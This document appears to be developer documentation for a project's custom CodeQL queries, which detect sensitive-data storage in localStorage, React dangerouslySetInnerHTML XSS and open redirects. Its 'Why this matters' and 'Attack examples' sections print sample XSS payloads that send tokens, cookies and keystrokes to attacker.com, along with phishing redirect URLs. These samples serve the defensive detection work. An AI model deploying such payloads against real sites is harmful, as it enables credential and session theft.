# JavaScript/TypeScript CodeQL Custom Queries

This directory contains custom CodeQL security queries for React/TypeScript frontend code.

## Purpose

These queries detect security vulnerabilities specific to React applications and TypeScript/JavaScript patterns used in this project. They complement CodeQL's standard JavaScript security queries with frontend-specific checks.

## Query Files

### 1. `localstorage-sensitive-data.ql`

**Detects:** Storage of sensitive data in `localStorage` or `sessionStorage`.

**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Severity:** Warning (5.0/10)

**What it catches:**

```typescript
// VULNERABLE - Sensitive data in localStorage
localStorage.setItem('auth_token', token);  // ❌ Accessible via XSS
localStorage.setItem('api_key', apiKey);    // ❌ Persists after browser close
sessionStorage.setItem('password', pwd);    // ❌ Still vulnerable to XSS

// SAFE - Use httpOnly cookies instead
// Set in backend:
response.set_cookie(
    "auth_token",
    token,
    httponly=True,  # ✓ Not accessible to JavaScript
    secure=True,    # ✓ Only sent over HTTPS
    samesite="strict"  # ✓ CSRF protection
)

// Frontend: Cookie sent automatically with requests
fetch('/api/protected', {
    credentials: 'include'  // ✓ Cookie included automatically
})
```

**Detection logic:**

1. Find calls to `localStorage.setItem()` or `sessionStorage.setItem()`
2. Extract the key argument (first parameter)
3. Check if key name suggests sensitive data:
   - `*password*`
   - `*token*`
   - `*secret*`
   - `*api_key*` / `*apikey*`
   - `*auth*`
   - `*credential*`
   - `*session*`
   - `*private*`
   - `*bearer*`

**Why this matters:**

```typescript
// If XSS vulnerability exists, attacker can steal tokens:
<script>
  const stolen = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal?token=' + stolen);
</script>

// With httpOnly cookies, JavaScript cannot access the token
```

**How to fix:**

```typescript
// Option 1: Use httpOnly cookies (preferred for auth tokens)
// Backend sets cookie, frontend doesn't handle token directly

// Option 2: Store in memory (React state/context)
const AuthContext = createContext();

function AuthProvider({ children }) {
  const [token, setToken] = useState(null);  // ✓ Memory only

  return (
    <AuthContext.Provider value={{ token, setToken }}>
      {children}
    </AuthContext.Provider>
  );
}

// Option 3: If you MUST use localStorage, encrypt it
import { encrypt, decrypt } from './crypto';

const encrypted = encrypt(token, userPassword);
localStorage.setItem('encrypted_token', encrypted);  // ✓ Encrypted

// Still vulnerable if attacker can run JS, but adds layer
```

**Project context:**

- This project is **single-user local deployment** (no authentication)
- Query serves as future-proofing if auth is added
- Camera settings and preferences can use localStorage (not sensitive)

---

### 2. `react-dangerous-html.ql`

**Detects:** Usage of React's `dangerouslySetInnerHTML` attribute.

**CWE:** CWE-079 (Cross-Site Scripting)

**Severity:** Warning (7.0/10)

**What it catches:**

```typescript
// VULNERABLE - Unsanitized HTML injection
function CommentCard({ comment }: { comment: string }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: comment }}  // ❌ XSS if comment has <script>
    />
  );
}

// SAFE - Use text content (React escapes automatically)
function CommentCard({ comment }: { comment: string }) {
  return <div>{comment}</div>;  // ✓ React auto-escapes
}

// SAFE - Sanitize with DOMPurify
import DOMPurify from 'dompurify';

function RichTextCard({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // ✓ Whitelist safe tags
    ALLOWED_ATTR: ['href']
  });

  return (
    <div dangerouslySetInnerHTML={{ __html: sanitized }} />  // ✓ Sanitized
  );
}
```

**Detection logic:**

1. Find JSX attributes named `dangerouslySetInnerHTML`
2. Flag all usages (all require review)

**Why this matters:**

```typescript
// If user input is rendered as HTML, XSS attack possible:
const userComment = "<img src=x onerror='alert(document.cookie)'>";

// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userComment }} />
// Browser executes: alert(document.cookie)

// SAFE
<div>{userComment}</div>
// Browser renders: &lt;img src=x onerror='alert(document.cookie)'&gt;
```

**Attack examples:**

```html
<!-- Steal cookies -->
<img src="x" onerror="fetch('https://attacker.com/steal?c=' + document.cookie)" />

<!-- Keylogger -->
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

<!-- Redirect to phishing site -->
<script>
  window.location = 'https://fake-bank.com';
</script>
```

**How to fix:**

```typescript
// Option 1: Don't use dangerouslySetInnerHTML (preferred)
function Card({ content }: { content: string }) {
  return <div>{content}</div>;  // ✓ React auto-escapes
}

// Option 2: Sanitize with DOMPurify
import DOMPurify from 'dompurify';

function Card({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'p', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false  // Block data-* attributes
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Option 3: Use markdown library (for rich text)
import ReactMarkdown from 'react-markdown';

function Card({ markdown }: { markdown: string }) {
  return <ReactMarkdown>{markdown}</ReactMarkdown>;  // ✓ Safe by default
}
```

**Project context:**

- AI-generated risk analysis text from Nemotron LLM
- Detection labels from YOLO26
- User input limited to settings (no free-form text fields)

---

### 3. `unsafe-redirect.ql`

**Detects:** Navigation to URLs that may be controlled by user input (open redirect vulnerability).

**CWE:** CWE-601 (URL Redirection to Untrusted Site)

**Severity:** Warning (6.0/10)

**What it catches:**

```typescript
// VULNERABLE - Unvalidated redirect
function RedirectHandler() {
  const searchParams = new URLSearchParams(window.location.search);
  const redirectUrl = searchParams.get('redirect'); // User-controlled

  useEffect(() => {
    window.location.href = redirectUrl; // ❌ Open redirect!
  }, []);
}

// Attacker creates link:
// https://yoursite.com/redirect?redirect=https://phishing.com

// SAFE - Validate against allowlist
function RedirectHandler() {
  const searchParams = new URLSearchParams(window.location.search);
  const redirectUrl = searchParams.get('redirect');

  const ALLOWED_DOMAINS = ['yoursite.com', 'api.yoursite.com'];

  useEffect(() => {
    try {
      const url = new URL(redirectUrl, window.location.origin);

      // Check domain is in allowlist
      if (!ALLOWED_DOMAINS.includes(url.hostname)) {
        console.error('Redirect to untrusted domain blocked');
        return;
      }

      window.location.href = url.href; // ✓ Validated
    } catch {
      console.error('Invalid redirect URL');
    }
  }, []);
}
```

**Detection logic:**

1. Find navigation calls:
   - `window.location.href = ...`
   - `window.location.replace(...)`
   - `window.location.assign(...)`
   - `window.open(...)`
   - React Router `navigate(...)`
2. Find URL parameter access:
   - `URLSearchParams.get(...)`
   - `useSearchParams()` hook
   - `window.location.search`
3. Check if both occur in same function (simplified taint tracking)

**Why this matters:**

```typescript
// Attacker crafts phishing link:
const attackUrl = 'https://legit-site.com/auth?redirect=https://fake-legit-site.com/steal-password';

// User clicks, sees "legit-site.com" in browser, trusts it
// After auth, redirects to attacker's clone site
// User enters credentials on fake site → stolen
```

**Attack scenarios:**

**1. Credential phishing:**

```
https://bank.com/login?next=https://fake-bank.com/collect
→ User logs into real bank
→ Redirects to fake bank asking for "additional verification"
```

**2. Malware delivery:**

```
https://trusted-site.com/download?url=https://malware-cdn.com/trojan.exe
→ User trusts "trusted-site.com" domain
→ Downloads malware
```

**3. OAuth token theft:**

```
https://oauth-provider.com/authorize?redirect_uri=https://attacker.com
→ User authorizes app
→ Access token sent to attacker
```

**How to fix:**

```typescript
// Option 1: Allowlist of trusted domains
const ALLOWED_ORIGINS = [
  'http://localhost:3000',
  'https://yourdomain.com',
  'https://api.yourdomain.com',
];

function validateRedirectUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);

    // Must be same origin or in allowlist
    return ALLOWED_ORIGINS.some((allowed) => {
      const allowedUrl = new URL(allowed);
      return parsed.origin === allowedUrl.origin;
    });
  } catch {
    return false; // Invalid URL
  }
}

// Usage
const redirectUrl = searchParams.get('redirect');
if (validateRedirectUrl(redirectUrl)) {
  navigate(redirectUrl); // ✓ Safe
} else {
  navigate('/'); // ✓ Fallback to home
}

// Option 2: Relative URLs only
function validateRelativeUrl(url: string): boolean {
  return url.startsWith('/') && !url.startsWith('//');
}

const redirectUrl = searchParams.get('redirect') || '/';
if (validateRelativeUrl(redirectUrl)) {
  navigate(redirectUrl); // ✓ Can only redirect within same site
}

// Option 3: Use path segments instead of full URLs
// Instead of: ?redirect=https://other-site.com
// Use: ?page=dashboard&section=settings

const page = searchParams.get('page');
const validPages = ['dashboard', 'settings', 'profile'];

if (validPages.includes(page)) {
  navigate(`/${page}`); // ✓ Controlled navigation
}
```

**React Router patterns:**

```typescript
// VULNERABLE
import { useNavigate, useSearchParams } from 'react-router-dom';

function Callback() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const next = searchParams.get('next');
  navigate(next); // ❌ Unvalidated
}

// SAFE
import { useNavigate, useSearchParams } from 'react-router-dom';

function Callback() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const next = searchParams.get('next') || '/';

  // Only allow relative paths
  if (next.startsWith('/') && !next.startsWith('//')) {
    navigate(next); // ✓ Validated
  } else {
    navigate('/'); // ✓ Safe fallback
  }
}
```

**Project context:**

- Frontend is SPA (no server-side redirects)
- Navigation uses React Router (client-side only)
- No authentication flow requiring redirects
- Camera feeds and event details use internal routing

---

## Package Definition

### `qlpack.yml`

```yaml
name: home-security-javascript-queries
version: 1.0.0
description: Custom CodeQL queries for React/TypeScript security patterns
dependencies:
  codeql/javascript-all: '*'
extractor: javascript
```

**Purpose:**

- Defines this directory as a CodeQL query pack
- Declares dependency on `codeql/javascript-all` (standard JavaScript library)
- Specifies `javascript` as the language extractor (handles TypeScript via transpilation)

**Usage in CI:**

```yaml
# .github/codeql/codeql-config.yml
queries:
  - uses: ./.github/codeql/custom-queries/javascript # References this pack
```

---

## Testing Queries Locally

### Prerequisites

```bash
# Install CodeQL CLI
# macOS
brew install codeql

# Linux
wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql-linux64.zip
unzip codeql-linux64.zip -d /opt
export PATH="/opt/codeql:$PATH"
```

### Create CodeQL Database

```bash
# From project root
cd frontend

# Install dependencies first (CodeQL needs node_modules)
npm install

# Create database
codeql database create ../codeql-db-javascript \
  --language=javascript \
  --source-root=. \
  --overwrite

# This creates database in ../codeql-db-javascript/
# Takes ~1-3 minutes for this project
```

### Run Individual Query

```bash
# From project root
codeql query run \
  .github/codeql/custom-queries/javascript/unsafe-redirect.ql \
  --database=codeql-db-javascript \
  --output=results.bqrs

# Format results as CSV
codeql bqrs decode results.bqrs --format=csv --output=results.csv

# Or as JSON
codeql bqrs decode results.bqrs --format=json --output=results.json
```

### Run All JavaScript Queries

```bash
# Run entire query pack
codeql database analyze codeql-db-javascript \
  .github/codeql/custom-queries/javascript \
  --format=sarif-latest \
  --output=results.sarif

# View results (pretty-printed)
cat results.sarif | jq '.runs[0].results[] | {
  ruleId: .ruleId,
  message: .message.text,
  location: .locations[0].physicalLocation.artifactLocation.uri,
  line: .locations[0].physicalLocation.region.startLine
}'
```

---

## Query Structure

### Standard Query Format

All queries follow this structure:

```ql
/**
 * @name [User-facing title]
 * @description [What vulnerability this detects and impact]
 * @kind problem
 * @problem.severity error|warning|recommendation
 * @security-severity [0.0-10.0 CVSS-like score]
 * @precision high|medium|low
 * @id js/[unique-identifier]
 * @tags security
 *       external/cwe/cwe-[XXX]
 */

import javascript  // Standard JavaScript library

// Define AST pattern classes
class VulnerablePattern extends [BaseClass] {
  VulnerablePattern() {
    // Constructor - defines what nodes match this pattern
  }

  // Helper methods
  predicate isSafe() {
    // Returns true if this pattern has mitigations
  }
}

// Query body
from VulnerablePattern vuln
where vuln.isVulnerable() and not vuln.isSafe()
select vuln, "Message explaining the issue and how to fix it"
```

### Key Components

**Metadata:**

- `@name` - Appears in GitHub Security tab
- `@security-severity` - 0.0 (info) to 10.0 (critical)
- `@precision` - Affects false positive rate (high/medium/low)
- `@id` - Unique identifier (format: `js/[query-name]`)
- `@tags` - Must include `security` and `external/cwe/cwe-XXX`

**Class definitions:**

- Extend AST node types: `MethodCallExpr`, `JSXAttribute`, `AssignExpr`, etc.
- Constructor defines pattern matching logic
- Predicates define conditional checks

**Query body:**

- `from` - Variables and their types
- `where` - Filter conditions
- `select` - What to report and message

---

## CodeQL JavaScript API

### Common AST Node Types

| Type             | Represents           | Example                |
| ---------------- | -------------------- | ---------------------- |
| `Function`       | Function declaration | `function foo() {}`    |
| `ArrowFunction`  | Arrow function       | `const foo = () => {}` |
| `MethodCallExpr` | Method call          | `obj.method(arg)`      |
| `CallExpr`       | Function call        | `foo(arg)`             |
| `PropAccess`     | Property access      | `obj.property`         |
| `JSXAttribute`   | JSX attribute        | `<div onClick={...}>`  |
| `JSXElement`     | JSX element          | `<Component />`        |
| `StringLiteral`  | String literal       | `"hello"` or `'world'` |
| `Identifier`     | Variable reference   | `myVariable`           |
| `AssignExpr`     | Assignment           | `x = 5`                |
| `BinaryExpr`     | Binary operation     | `a + b`                |

### Common Predicates

| Predicate                | Returns                        |
| ------------------------ | ------------------------------ | ----- | --------------------------------- |
| `getReceiver()`          | Object receiving method call   |
| `getMethodName()`        | Name of method being called    |
| `getCalleeName()`        | Name of function being called  |
| `getArgument(n)`         | The nth argument (0-indexed)   |
| `getName()`              | Name of attribute/property     |
| `getValue()`             | Value of literal or expression |
| `getPropertyName()`      | Name of accessed property      |
| `getEnclosingFunction()` | Function containing this node  |
| `exists(T x              | ...                            | ...)` | True if there exists a matching x |

### Example: Finding localStorage Calls

```ql
class LocalStorageSetItem extends MethodCallExpr {
  LocalStorageSetItem() {
    // Find: localStorage.setItem(...)
    exists(PropAccess pa |
      this.getReceiver() = pa and
      pa.getPropertyName() = "localStorage" and
      this.getMethodName() = "setItem"
    )
    or
    // Or: identifier named 'localStorage'
    exists(Identifier id |
      this.getReceiver() = id and
      id.getName() = "localStorage" and
      this.getMethodName() = "setItem"
    )
  }

  Expr getKeyArg() {
    result = this.getArgument(0)
  }

  Expr getValueArg() {
    result = this.getArgument(1)
  }
}
```

---

## Common Patterns

### Pattern 1: Find Method Calls

```ql
class DangerousApiCall extends MethodCallExpr {
  DangerousApiCall() {
    this.getMethodName() = "eval" or
    this.getMethodName() = "setTimeout" and
    this.getArgument(0) instanceof StringLiteral
  }
}

from DangerousApiCall call
select call, "Dangerous use of eval or setTimeout with string"
```

### Pattern 2: Check JSX Attributes

```ql
class DangerousJSXAttribute extends JSXAttribute {
  DangerousJSXAttribute() {
    this.getName() = "dangerouslySetInnerHTML"
  }

  JSXElement getElement() {
    result = this.getParent()
  }
}

from DangerousJSXAttribute attr
select attr, "Found dangerouslySetInnerHTML in " + attr.getElement().getName()
```

### Pattern 3: String Pattern Matching

```ql
class SensitiveKey extends MethodCallExpr {
  predicate hasSensitiveKey() {
    exists(string key |
      key = this.getArgument(0).(StringLiteral).getValue().toLowerCase() and
      (
        key.matches("%password%") or
        key.matches("%token%") or
        key.matches("%secret%")
      )
    )
  }
}

from SensitiveKey call
where call.hasSensitiveKey()
select call, "Sensitive key in storage"
```

### Pattern 4: Data Flow Tracking

```ql
import javascript
import semmle.javascript.dataflow.DataFlow

class UrlParamAccess extends DataFlow::Node {
  UrlParamAccess() {
    // URLSearchParams.get()
    exists(MethodCallExpr mc |
      this.asExpr() = mc and
      mc.getMethodName() = "get" and
      mc.getReceiver().getType().toString().matches("%URLSearchParams%")
    )
  }
}

class NavigationSink extends DataFlow::Node {
  NavigationSink() {
    // window.location.href = ...
    exists(AssignExpr ae |
      this.asExpr() = ae.getRhs() and
      ae.getLhs().(PropAccess).getPropertyName() = "href"
    )
  }
}

from UrlParamAccess source, NavigationSink sink
where DataFlow::localFlow(source, sink)
select sink, "URL parameter flows to navigation without validation"
```

---

## Integration with CI/CD

### Workflow

1. **Trigger:** Merge to `main` or weekly schedule (Monday 6am UTC)
2. **Initialize:** CodeQL action loads `.github/codeql/codeql-config.yml`
3. **Build database:** CodeQL analyzes JavaScript/TypeScript source
4. **Run queries:**
   - Standard security queries (`security-and-quality`, `security-extended`)
   - Custom JavaScript queries (this directory)
5. **Upload results:** SARIF format to GitHub Security tab

### Viewing Results

```bash
# In GitHub UI:
Repository → Security → Code scanning alerts → Filter by "CodeQL"

# Results include:
# - Rule ID (e.g., js/react-dangerous-html)
# - Severity (Error/Warning)
# - File location with line number
# - Recommendation text
```

### Suppressing False Positives

If a finding is a false positive:

```typescript
// Option 1: Refactor to avoid pattern
// Instead of dangerouslySetInnerHTML, use React's children
<div>{content}</div>  // React auto-escapes

// Option 2: Add comment explaining safety (for human reviewers)
// Safe: content is sanitized by DOMPurify before this component
<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />

// Option 3: Sanitize explicitly (makes query's recommendation moot)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(content);
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

---

## Maintenance

### Adding New Queries

1. **Identify vulnerability pattern** - What React/JS pattern is dangerous?
2. **Research CWE** - Find appropriate Common Weakness Enumeration
3. **Write query** - Follow template above
4. **Test locally** - Create database and run query
5. **Tune precision** - Adjust to minimize false positives
6. **Update AGENTS.md** - Document in this file

### Query Performance Tips

- **Use `exists()` efficiently** - Avoid deeply nested exists clauses
- **Filter early** - Apply cheap string matches before expensive AST traversal
- **Limit scope** - Use `getEnclosingFunction()` instead of global searches
- **Cache predicates** - Store intermediate results in class methods

### When to Update

- **React API changes** - New React patterns or hooks
- **False positives** - Users report safe code flagged as vulnerable
- **New vulnerabilities** - OWASP publishes new attack vectors
- **Performance issues** - Query takes > 5 minutes to run

---

## Related Documentation

- **Parent directory:** See `../AGENTS.md` for CodeQL overview
- **Python queries:** See `../python/AGENTS.md`
- **React security:** See `/frontend/AGENTS.md`
- **CI/CD workflows:** See `/.github/workflows/codeql.yml`

## External Resources

- [CodeQL JavaScript docs](https://codeql.github.com/docs/codeql-language-guides/codeql-for-javascript/)
- [JavaScript AST reference](https://codeql.github.com/codeql-standard-libraries/javascript/)
- [React security best practices](https://react.dev/learn/escape-hatches)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Key Takeaways

1. **3 custom JavaScript queries** - Storage security, XSS, open redirect
2. **Target React patterns** - JSX attributes, hooks, browser APIs
3. **XSS focus** - `dangerouslySetInnerHTML` is highest severity (7.0)
4. **Local testing available** - Install CodeQL CLI and create database
5. **Complements other tools** - Works alongside ESLint (pre-commit) and TypeScript
6. **Results in Security tab** - View findings in GitHub UI after merge to main
7. **Project context** - Single-user local deployment, future-proofed for auth
